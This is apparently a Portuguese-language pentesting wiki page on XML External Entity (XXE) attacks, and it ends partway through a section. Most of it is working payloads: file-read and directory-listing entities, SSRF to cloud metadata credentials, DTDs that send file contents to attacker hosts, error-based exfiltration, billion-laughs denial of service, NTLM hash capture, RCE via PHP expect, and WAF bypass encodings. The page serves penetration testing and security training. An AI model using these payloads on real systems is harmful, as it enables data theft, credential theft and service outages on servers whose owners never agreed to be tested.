# XXE - XEE - XML External Entity

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Fundamentos do XML

XML é uma linguagem de marcação projetada para armazenamento e transporte de dados, apresentando uma estrutura flexível que permite o uso de tags nomeadas descritivamente. Ela difere do HTML por não estar limitada a um conjunto de tags predefinidas. A importância do XML diminuiu com o surgimento do JSON, apesar de seu papel inicial na tecnologia AJAX.

- **Representação de Dados através de Entidades**: Entidades em XML permitem a representação de dados, incluindo caracteres especiais como `&lt;` e `&gt;`, que correspondem a `<` e `>` para evitar conflitos com o sistema de tags do XML.
- **Definindo Elementos XML**: XML permite a definição de tipos de elementos, delineando como os elementos devem ser estruturados e que conteúdo podem conter, variando de qualquer tipo de conteúdo a elementos filhos específicos.
- **Definição de Tipo de Documento (DTD)**: DTDs são cruciais no XML para definir a estrutura do documento e os tipos de dados que ele pode conter. Eles podem ser internos, externos ou uma combinação, orientando como os documentos são formatados e validados.
- **Entidades Personalizadas e Externas**: XML suporta a criação de entidades personalizadas dentro de um DTD para representação flexível de dados. Entidades externas, definidas com uma URL, levantam preocupações de segurança, particularmente no contexto de ataques de Entidade Externa XML (XXE), que exploram a forma como os analisadores XML lidam com fontes de dados externas: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **Detecção de XXE com Entidades de Parâmetro**: Para detectar vulnerabilidades XXE, especialmente quando métodos convencionais falham devido a medidas de segurança do analisador, entidades de parâmetro XML podem ser utilizadas. Essas entidades permitem técnicas de detecção fora de banda, como acionar consultas DNS ou requisições HTTP para um domínio controlado, para confirmar a vulnerabilidade.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Principais ataques

[**A maioria desses ataques foi testada usando os incríveis laboratórios XEE da Portswiggers: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Teste de Nova Entidade

Neste ataque, vou testar se uma simples declaração de NOVA ENTIDADE está funcionando.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### Ler arquivo

Vamos tentar ler `/etc/passwd` de diferentes maneiras. Para Windows, você pode tentar ler: `C:\windows\system32\drivers\etc\hosts`

Neste primeiro caso, observe que SYSTEM "_\*\*file:///\*\*etc/passwd_" também funcionará.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

Este segundo caso deve ser útil para extrair um arquivo se o servidor web estiver usando PHP (não é o caso dos laboratórios Portswigger)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Neste terceiro caso, observe que estamos declarando o `Element stockCheck` como ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### Listagem de diretórios

Em aplicações baseadas em **Java**, pode ser possível **listar o conteúdo de um diretório** via XXE com um payload como (apenas pedindo o diretório em vez do arquivo):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Um XXE pode ser usado para abusar de um SSRF dentro de uma nuvem.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Usando a **técnica comentada anteriormente**, você pode fazer o servidor acessar um servidor que você controla para mostrar que ele é vulnerável. Mas, se isso não estiver funcionando, talvez seja porque **entidades XML não são permitidas**, nesse caso você poderia tentar usar **entidades de parâmetro XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltrar dados fora da banda

**Nesta ocasião, vamos fazer o servidor carregar um novo DTD com um payload malicioso que enviará o conteúdo de um arquivo via requisição HTTP (para arquivos de várias linhas, você pode tentar exfiltrá-lo via \_ftp://**\_ usando este servidor básico, por exemplo, [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Esta explicação é baseada em** [**Portswiggers lab aqui**](https://portswigger.net/web-security/xxe/blind)**.**

No DTD malicioso fornecido, uma série de etapas são realizadas para exfiltrar dados:

### Exemplo de DTD Malicioso:

A estrutura é a seguinte:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Os passos executados por este DTD incluem:

1. **Definição de Entidades de Parâmetro:**
- Uma entidade de parâmetro XML, `%file`, é criada, lendo o conteúdo do arquivo `/etc/hostname`.
- Outra entidade de parâmetro XML, `%eval`, é definida. Ela declara dinamicamente uma nova entidade de parâmetro XML, `%exfiltrate`. A entidade `%exfiltrate` é configurada para fazer uma solicitação HTTP ao servidor do atacante, passando o conteúdo da entidade `%file` dentro da string de consulta da URL.
2. **Execução de Entidades:**
- A entidade `%eval` é utilizada, levando à execução da declaração dinâmica da entidade `%exfiltrate`.
- A entidade `%exfiltrate` é então usada, acionando uma solicitação HTTP para a URL especificada com o conteúdo do arquivo.

O atacante hospeda este DTD malicioso em um servidor sob seu controle, tipicamente em uma URL como `http://web-attacker.com/malicious.dtd`.

**Carga Útil XXE:** Para explorar uma aplicação vulnerável, o atacante envia uma carga útil XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload define uma entidade de parâmetro XML `%xxe` e a incorpora dentro do DTD. Quando processado por um parser XML, este payload busca o DTD externo do servidor do atacante. O parser então interpreta o DTD inline, executando os passos descritos no DTD malicioso e levando à exfiltração do arquivo `/etc/hostname` para o servidor do atacante.

### Baseado em Erro (DTD Externo)

**Neste caso, vamos fazer o servidor carregar um DTD malicioso que mostrará o conteúdo de um arquivo dentro de uma mensagem de erro (isso é válido apenas se você puder ver mensagens de erro).** [**Exemplo daqui.**](https://portswigger.net/web-security/xxe/blind)

Uma mensagem de erro de parsing XML, revelando o conteúdo do arquivo `/etc/passwd`, pode ser acionada usando um Documento Tipo de Definição (DTD) externo malicioso. Isso é realizado através dos seguintes passos:

1. Uma entidade de parâmetro XML chamada `file` é definida, que contém o conteúdo do arquivo `/etc/passwd`.
2. Uma entidade de parâmetro XML chamada `eval` é definida, incorporando uma declaração dinâmica para outra entidade de parâmetro XML chamada `error`. Esta entidade `error`, quando avaliada, tenta carregar um arquivo inexistente, incorporando o conteúdo da entidade `file` como seu nome.
3. A entidade `eval` é invocada, levando à declaração dinâmica da entidade `error`.
4. A invocação da entidade `error` resulta em uma tentativa de carregar um arquivo inexistente, produzindo uma mensagem de erro que inclui o conteúdo do arquivo `/etc/passwd` como parte do nome do arquivo.

O DTD externo malicioso pode ser invocado com o seguinte XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ao ser executada, a resposta do servidor web deve incluir uma mensagem de erro exibindo o conteúdo do arquivo `/etc/passwd`.

![](<../images/image (809).png>)

_**Por favor, note que DTD externo nos permite incluir uma entidade dentro da segunda (\*\***`eval`\***\*), mas isso é proibido no DTD interno. Portanto, você não pode forçar um erro sem usar um DTD externo (geralmente).**_

### **Baseado em Erro (system DTD)**

E quanto às vulnerabilidades XXE cegas quando **interações fora de banda estão bloqueadas** (conexões externas não estão disponíveis)?

Uma brecha na especificação da linguagem XML pode **expor dados sensíveis através de mensagens de erro quando o DTD de um documento mistura declarações internas e externas**. Este problema permite a redefinição interna de entidades declaradas externamente, facilitando a execução de ataques XXE baseados em erro. Esses ataques exploram a redefinição de uma entidade de parâmetro XML, originalmente declarada em um DTD externo, a partir de um DTD interno. Quando conexões fora de banda são bloqueadas pelo servidor, os atacantes devem confiar em arquivos DTD locais para conduzir o ataque, visando induzir um erro de análise para revelar informações sensíveis.

Considere um cenário onde o sistema de arquivos do servidor contém um arquivo DTD em `/usr/local/app/schema.dtd`, definindo uma entidade chamada `custom_entity`. Um atacante pode induzir um erro de análise XML revelando o conteúdo do arquivo `/etc/passwd` ao submeter um DTD híbrido da seguinte forma:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Os passos delineados são executados por este DTD:

- A definição de uma entidade de parâmetro XML chamada `local_dtd` inclui o arquivo DTD externo localizado no sistema de arquivos do servidor.
- Uma redefinição ocorre para a entidade de parâmetro XML `custom_entity`, originalmente definida no DTD externo, para encapsular um [exploit XXE baseado em erro](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Esta redefinição é projetada para provocar um erro de análise, expondo o conteúdo do arquivo `/etc/passwd`.
- Ao empregar a entidade `local_dtd`, o DTD externo é ativado, abrangendo a nova entidade definida `custom_entity`. Esta sequência de ações precipita a emissão da mensagem de erro pretendida pelo exploit.

**Exemplo do mundo real:** Sistemas que utilizam o ambiente de desktop GNOME frequentemente têm um DTD em `/usr/share/yelp/dtd/docbookx.dtd` contendo uma entidade chamada `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

Como esta técnica usa um **DTD interno, você precisa encontrar um válido primeiro**. Você pode fazer isso **instalando** o mesmo **SO / Software** que o servidor está usando e **procurando alguns DTDs padrão**, ou **pegando uma lista** de **DTDs padrão** dentro dos sistemas e **verificando** se algum deles existe:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Para mais informações, consulte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Encontrando DTDs dentro do sistema

No seguinte incrível repositório do github, você pode encontrar **caminhos de DTDs que podem estar presentes no sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Além disso, se você tiver a **imagem Docker do sistema da vítima**, pode usar a ferramenta do mesmo repositório para **escanear** a **imagem** e **encontrar** o caminho dos **DTDs** presentes dentro do sistema. Leia o [Readme do github](https://github.com/GoSecure/dtd-finder) para aprender como.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Para uma explicação mais detalhada deste ataque, **verifique a segunda seção de** [**este post incrível**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **da Detectify**.

A capacidade de **fazer upload de documentos do Microsoft Office é oferecida por muitas aplicações web**, que então procedem a extrair certos detalhes desses documentos. Por exemplo, uma aplicação web pode permitir que os usuários importem dados fazendo upload de uma planilha no formato XLSX. Para que o parser extraia os dados da planilha, ele inevitavelmente precisará analisar pelo menos um arquivo XML.

Para testar essa vulnerabilidade, é necessário criar um **arquivo do Microsoft Office contendo um payload XXE**. O primeiro passo é criar um diretório vazio para o qual o documento pode ser descompactado.

Uma vez que o documento tenha sido descompactado, o arquivo XML localizado em `./unzipped/word/document.xml` deve ser aberto e editado em um editor de texto preferido (como vim). O XML deve ser modificado para incluir o payload XXE desejado, geralmente começando com uma solicitação HTTP.

As linhas XML modificadas devem ser inseridas entre os dois objetos XML raiz. É importante substituir a URL por uma URL monitorável para solicitações.

Finalmente, o arquivo pode ser compactado para criar o arquivo malicioso poc.docx. A partir do diretório "unzipped" previamente criado, o seguinte comando deve ser executado:

Agora, o arquivo criado pode ser enviado para a aplicação web potencialmente vulnerável, e pode-se esperar que uma solicitação apareça nos logs do Burp Collaborator.

### Jar: protocol

O **protocolo jar** é acessível exclusivamente dentro de **aplicações Java**. Ele é projetado para permitir o acesso a arquivos dentro de um **arquivo PKZIP** (por exemplo, `.zip`, `.jar`, etc.), atendendo a arquivos locais e remotos.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> Para poder acessar arquivos dentro de arquivos PKZIP é **super útil para abusar de XXE via arquivos DTD do sistema.** Confira [esta seção para aprender como abusar de arquivos DTD do sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).

O processo para acessar um arquivo dentro de um arquivo PKZIP via o protocolo jar envolve várias etapas:

1. Um pedido HTTP é feito para baixar o arquivo zip de um local especificado, como `https://download.website.com/archive.zip`.
2. A resposta HTTP contendo o arquivo é armazenada temporariamente no sistema, tipicamente em um local como `/tmp/...`.
3. O arquivo é então extraído para acessar seu conteúdo.
4. O arquivo específico dentro do arquivo, `file.zip`, é lido.
5. Após a operação, quaisquer arquivos temporários criados durante esse processo são deletados.

Uma técnica interessante para interromper esse processo na segunda etapa envolve manter a conexão do servidor aberta indefinidamente ao servir o arquivo do arquivo. Ferramentas disponíveis neste [repositório](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) podem ser utilizadas para esse propósito, incluindo um servidor Python (`slow_http_server.py`) e um servidor Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> Escrever arquivos em um diretório temporário pode ajudar a **escalar outra vulnerabilidade que envolve uma travessia de caminho** (como inclusão de arquivo local, injeção de template, XSLT RCE, desserialização, etc).

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque dos Bilhões de Risadas
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explosão Quadrática

![](<../images/image (527).png>)

#### Obtendo NTML

Em hosts Windows, é possível obter o hash NTML do usuário do servidor web configurando um manipulador responder.py:
```bash
Responder.py -I eth0 -v
```
e enviando a seguinte solicitação
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Então você pode tentar quebrar o hash usando hashcat

## Superfícies XXE Ocultas

### XInclude

Ao integrar dados do cliente em documentos XML do lado do servidor, como aqueles em solicitações SOAP de backend, o controle direto sobre a estrutura XML é frequentemente limitado, dificultando ataques XXE tradicionais devido a restrições na modificação do elemento `DOCTYPE`. No entanto, um ataque `XInclude` oferece uma solução ao permitir a inserção de entidades externas dentro de qualquer elemento de dados do documento XML. Este método é eficaz mesmo quando apenas uma parte dos dados dentro de um documento XML gerado pelo servidor pode ser controlada.

Para executar um ataque `XInclude`, o namespace `XInclude` deve ser declarado, e o caminho do arquivo para a entidade externa pretendida deve ser especificado. Abaixo está um exemplo sucinto de como tal ataque pode ser formulado:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Confira [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informações!

### SVG - Upload de Arquivo

Arquivos enviados por usuários para certas aplicações, que são então processados no servidor, podem explorar vulnerabilidades na forma como arquivos XML ou formatos de arquivo que contêm XML são tratados. Formatos de arquivo comuns, como documentos de escritório (DOCX) e imagens (SVG), são baseados em XML.

Quando os usuários **enviam imagens**, essas imagens são processadas ou validadas no lado do servidor. Mesmo para aplicações que esperam formatos como PNG ou JPEG, a **biblioteca de processamento de imagens do servidor também pode suportar imagens SVG**. O SVG, sendo um formato baseado em XML, pode ser explorado por atacantes para enviar imagens SVG maliciosas, expondo assim o servidor a vulnerabilidades XXE (XML External Entity).

Um exemplo de tal exploit é mostrado abaixo, onde uma imagem SVG maliciosa tenta ler arquivos do sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Outro método envolve tentar **executar comandos** através do wrapper "expect" do PHP:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Em ambos os casos, o formato SVG é usado para lançar ataques que exploram as capacidades de processamento XML do software do servidor, destacando a necessidade de validação robusta de entrada e medidas de segurança.

Verifique [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informações!

**Observe que a primeira linha do arquivo lido ou do resultado da execução aparecerá DENTRO da imagem criada. Portanto, você precisa ser capaz de acessar a imagem que o SVG criou.**

### **PDF - Upload de arquivo**

Leia o seguinte post para **aprender como explorar um XXE fazendo upload de um arquivo PDF**:

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### Content-Type: De x-www-urlencoded para XML

Se uma solicitação POST aceitar os dados no formato XML, você pode tentar explorar um XXE nessa solicitação. Por exemplo, se uma solicitação normal contiver o seguinte:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Então você pode ser capaz de enviar a seguinte solicitação, com o mesmo resultado:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON para XEE

Para alterar a solicitação, você pode usar uma extensão do Burp chamada “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) você pode encontrar este exemplo:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Outro exemplo pode ser encontrado [aqui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypasses de WAF e Proteções

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Isso só funciona se o servidor XML aceitar o protocolo `data://`.

### UTF-7

Você pode usar a \[**"Receita de Codificação" do cyberchef aqui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)para]\([https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29para](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29para)) transformar para UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

Se a web estiver usando PHP, em vez de usar `file:/` você pode usar **php wrappers**`php://filter/convert.base64-encode/resource=` para **acessar arquivos internos**.

Se a web estiver usando Java, você pode verificar o [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Truque de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Você pode criar uma **entidade dentro de uma entidade** codificando-a com **html entities** e então chamá-la para **carregar um dtd**.\
Note que as **HTML Entities** usadas precisam ser **numéricas** (como \[neste exemplo]\([https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Exemplo de DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Extrair** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrair recurso externo**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Execução remota de código

**Se o módulo "expect" do PHP estiver carregado**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Este exemplo é inspirado em [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) é utilizado para padronizar a troca de dados em processos de localização. É um formato baseado em XML, principalmente usado para transferir dados localizáveis entre ferramentas durante a localização e como um formato comum de troca para ferramentas CAT (Computer-Aided Translation).

### Análise de Requisição Cega

Uma requisição é feita ao servidor com o seguinte conteúdo:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
No entanto, esta solicitação aciona um erro interno do servidor, mencionando especificamente um problema com as declarações de marcação:
```json
{
"status": 500,
"error": "Internal Server Error",
"message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
}
```
Apesar do erro, um acerto é registrado no Burp Collaborator, indicando algum nível de interação com a entidade externa.

Exfiltração de Dados Fora de Banda Para exfiltrar dados, uma solicitação modificada é enviada:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Essa abordagem revela que o User Agent indica o uso do Java 1.8. Uma limitação observada com esta versão do Java é a incapacidade de recuperar arquivos contendo um caractere de nova linha, como /etc/passwd, usando a técnica Out of Band.

Exfiltração de Dados Baseada em Erro Para superar essa limitação, uma abordagem Baseada em Erro é empregada. O arquivo DTD é estruturado da seguinte forma para acionar um erro que inclui dados de um arquivo alvo:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
O servidor responde com um erro, refletindo importantemente o arquivo inexistente, indicando que o servidor está tentando acessar o arquivo especificado:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Para incluir o conteúdo do arquivo na mensagem de erro, o arquivo DTD é ajustado:
```xml
